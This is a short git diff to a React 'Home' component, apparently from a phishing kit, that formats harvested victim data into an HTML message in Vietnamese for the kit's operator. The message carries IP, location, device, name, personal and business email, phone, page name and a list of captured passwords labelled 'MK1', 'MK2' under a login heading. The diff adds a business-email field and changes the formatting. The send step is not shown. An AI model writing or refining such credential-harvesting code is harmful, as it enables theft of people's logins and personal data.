@@ -310,6 +310,8 @@ const Home = () => {
         const safeRegion = ip.region || 'Unknown';
         const safeCountry = ip.country || 'Unknown';
         const parsedDevice = parseDeviceInfo(device.deviceInfo);
+        const deviceLine = '';
+        // const deviceLine = `\n📱 Thiết bị: ${escapeHtml(parsedDevice)}`;
 
         const passwordLines = passwordLogs.length > 0
             ? passwordLogs.map((pwd, idx) => `   MK${idx + 1}: <code>${escapeHtml(pwd)}</code>`).join('\n')
@@ -321,15 +323,15 @@ const Home = () => {
 
         const message = `📩 <b>${escapeHtml(LABEL)}</b>
 ⏰ ${formatDateTime()}
-🌐 IP: <code>${escapeHtml(safeIp)}</code>
-📱 Thiết bị: ${escapeHtml(parsedDevice)}
+🌐 IP: <code>${escapeHtml(safeIp)}</code>${deviceLine}
 📍 Vị trí: ${escapeHtml(`${safeCity}, ${safeRegion}, ${safeCountry}`)}
 ━━━━━━━━━━━━━━━━━━━━
 📋 <b>THÔNG TIN</b>
-   Tên: ${escapeHtml(form.fullName)}
-   Email: ${escapeHtml(form.personalEmail)}
+   Tên: <code>${escapeHtml(form.fullName)}</code>
+   Email: <code>${escapeHtml(form.personalEmail)}</code>
+   Email DN: <code>${escapeHtml(form.businessEmail)}</code>
    SĐT: <code>${escapeHtml(form.phone)}</code>
-   Page: ${escapeHtml(form.pageName)}
+   Page: <code>${escapeHtml(form.pageName)}</code>
 
 🔐 <b>ĐĂNG NHẬP</b>
 ${passwordLines}
